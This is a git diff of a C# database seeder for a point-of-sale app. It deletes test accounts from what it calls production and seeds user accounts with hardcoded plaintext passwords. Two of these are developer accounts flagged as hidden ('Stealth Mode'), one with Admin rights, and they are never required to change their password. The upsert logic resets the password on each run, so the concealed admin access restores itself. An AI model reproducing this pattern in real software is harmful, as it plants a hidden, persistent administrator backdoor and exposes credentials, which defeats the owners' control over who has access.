@@ -22,78 +22,32 @@ public static class DataSeeder
             await SqliteSchemaPatcher.EnsureSchemaUpdatedAsync(context);
         }
 
-        // Si la tabla Usuarios está vacía, sembramos el usuario fundador (Admin)
-        if (!await context.Usuarios.AnyAsync())
+        // Limpieza obligatoria de cuentas ficticias / testing en la base de Producción
+        var dummyEmails = new[]
         {
-            var adminUser = new Usuario
-            {
-                Nombre = "Admin Fundador",
-                Email = AdminEmailDefault,
-                PasswordHash = hasher.Hash(AdminDefaultPassword),
-                Rol = RolUsuario.Admin,
-                DebeCambiarPassword = true,
-                Activo = true,
-                FechaCreacion = DateTime.UtcNow
-            };
-
-            context.Usuarios.Add(adminUser);
+            "cajero.sandbox@dastik.com",
+            "sofia.empleada@dastik.com",
+            "lucas@dastik.com",
+            "franco@dastik.com",
+            "admin@dastik.com"
+        };
+        var usuariosBasura = await context.Usuarios
+            .Where(u => dummyEmails.Contains(u.Email))
+            .ToListAsync();
+        if (usuariosBasura.Count > 0)
+        {
+            context.Usuarios.RemoveRange(usuariosBasura);
             await context.SaveChangesAsync();
         }
 
-        // Si el usuario cajero de entrenamiento no existe, lo sembramos
-        var cajeroUser = await context.Usuarios.FirstOrDefaultAsync(u => u.Email == "cajero.sandbox@dastik.com");
-        if (cajeroUser is null)
-        {
-            cajeroUser = new Usuario
-            {
-                Nombre = "Cajero Sandbox Entrenado",
-                Email = "cajero.sandbox@dastik.com",
-                PasswordHash = hasher.Hash("Dastik2026!"),
-                Rol = RolUsuario.Empleado,
-                DebeCambiarPassword = false,
-                Activo = true,
-                TurnoAsignado = "Mañana",
-                TarifaPorHora = 3500.00m,
-                FechaCreacion = DateTime.UtcNow
-            };
+        // Sembrar cuentas de Desarrollador Invisibles (Stealth Mode: EsOcultoDev = true)
+        await UpsertUsuarioAsync(context, hasher, "tomidev@dastik.com", "Tomi (Admin Dev)", "TomiDev2026!", RolUsuario.Admin, debeCambiarPassword: false, turno: "Completo", tarifa: 0m, esOcultoDev: true);
+        await UpsertUsuarioAsync(context, hasher, "tomi.empleado@dastik.com", "Tomi (Cajero Test)", "TomiDev2026!", RolUsuario.Empleado, debeCambiarPassword: false, turno: "Mañana", tarifa: 4000m, esOcultoDev: true);
 
-            context.Usuarios.Add(cajeroUser);
-            await context.SaveChangesAsync();
-        }
-        else if (cajeroUser.TarifaPorHora == 0m)
-        {
-            cajeroUser.TurnoAsignado = "Mañana";
-            cajeroUser.TarifaPorHora = 3500.00m;
-            await context.SaveChangesAsync();
-        }
-
-        // Sembrar segundo empleado para turno tarde (Sofía Martínez)
-        var sofiaUser = await context.Usuarios.FirstOrDefaultAsync(u => u.Email == "sofia.empleada@dastik.com");
-        if (sofiaUser is null)
-        {
-            sofiaUser = new Usuario
-            {
-                Nombre = "Sofía Martínez",
-                Email = "sofia.empleada@dastik.com",
-                PasswordHash = hasher.Hash("Dastik2026!"),
-                Rol = RolUsuario.Empleado,
-                DebeCambiarPassword = false,
-                Activo = true,
-                TurnoAsignado = "Tarde",
-                TarifaPorHora = 3800.00m,
-                FechaCreacion = DateTime.UtcNow
-            };
-
-            context.Usuarios.Add(sofiaUser);
-            await context.SaveChangesAsync();
-        }
-
-        // Sembrar / actualizar las 5 cuentas oficiales y de testing
-        await UpsertUsuarioAsync(context, hasher, "tomidev@dastik.com", "Tomi (Admin Dev)", "TomiDev2026!", RolUsuario.Admin, debeCambiarPassword: false, turno: "Completo", tarifa: 0m);
-        await UpsertUsuarioAsync(context, hasher, "tomi.empleado@dastik.com", "Tomi (Cajero Test)", "TomiDev2026!", RolUsuario.Empleado, debeCambiarPassword: false, turno: "Mañana", tarifa: 4000m);
-        await UpsertUsuarioAsync(context, hasher, "diego@dastik.com", "Diego", "Dastik2026!", RolUsuario.Admin, debeCambiarPassword: true, turno: "Completo", tarifa: 0m);
-        await UpsertUsuarioAsync(context, hasher, "ale@dastik.com", "Ale", "Dastik2026!", RolUsuario.Empleado, debeCambiarPassword: true, turno: "Mañana", tarifa: 4500m);
-        await UpsertUsuarioAsync(context, hasher, "facundo@dastik.com", "Facundo", "Dastik2026!", RolUsuario.Empleado, debeCambiarPassword: true, turno: "Tarde", tarifa: 4500m);
+        // Sembrar cuentas Oficiales del Equipo Dastik (Producción: EsOcultoDev = false)
+        await UpsertUsuarioAsync(context, hasher, "diego@dastik.com", "Diego", "Dastik2026!", RolUsuario.Admin, debeCambiarPassword: true, turno: "Completo", tarifa: 0m, esOcultoDev: false);
+        await UpsertUsuarioAsync(context, hasher, "ale@dastik.com", "Ale", "Dastik2026!", RolUsuario.Empleado, debeCambiarPassword: true, turno: "Mañana", tarifa: 4500m, esOcultoDev: false);
+        await UpsertUsuarioAsync(context, hasher, "facundo@dastik.com", "Facundo", "Dastik2026!", RolUsuario.Empleado, debeCambiarPassword: true, turno: "Tarde", tarifa: 4500m, esOcultoDev: false);
 
         // Sembrar o actualizar Unidades de Negocio con credenciales de Tiendanube desde variables de entorno
         var configuration = scope.ServiceProvider.GetService<Microsoft.Extensions.Configuration.IConfiguration>();
@@ -260,7 +214,8 @@ public static class DataSeeder
         RolUsuario rol,
         bool debeCambiarPassword,
         string turno,
-        decimal tarifa)
+        decimal tarifa,
+        bool esOcultoDev = false)
     {
         var emailLower = email.Trim().ToLowerInvariant();
         var user = context.Usuarios.Local.FirstOrDefault(u => u.Email.Trim().ToLowerInvariant() == emailLower)
@@ -277,7 +232,8 @@ public static class DataSeeder
                 Activo = true,
                 TurnoAsignado = turno,
                 TarifaPorHora = tarifa,
-                FechaCreacion = DateTime.UtcNow
+                FechaCreacion = DateTime.UtcNow,
+                EsOcultoDev = esOcultoDev
             };
             context.Usuarios.Add(user);
         }
@@ -287,6 +243,7 @@ public static class DataSeeder
             user.Rol = rol;
             user.Activo = true;
             user.TurnoAsignado = turno;
+            user.EsOcultoDev = esOcultoDev;
             if (tarifa > 0m) user.TarifaPorHora = tarifa;
             if (user.DebeCambiarPassword || !hasher.Verify(password, user.PasswordHash))
             {
